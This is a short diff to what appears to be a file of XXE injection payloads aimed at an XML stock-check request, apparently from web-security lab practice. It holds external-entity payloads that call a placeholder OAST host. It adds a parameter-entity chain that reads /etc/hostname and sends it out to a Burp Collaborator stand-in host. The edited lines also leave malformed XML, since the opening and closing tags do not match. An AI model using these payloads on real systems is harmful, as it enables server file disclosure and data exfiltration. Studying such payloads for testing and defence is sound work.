@@ -1,8 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://YOUR-OAST">]>
-<stockCheck><productId>2&xxe;</productId><storeId>1</storeId></stockCheck>
+<stock><product>2&xxe;</product><store>1</store></check>
 
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-OAST"> %xxe; ]>
-<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+<!DOCTYPE check [<!ENTITY % xxe SYSTEM "http://YOUR-OAST"> %xxe; ]>
+<stock><product>2</product><store>1</store></check>
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
 
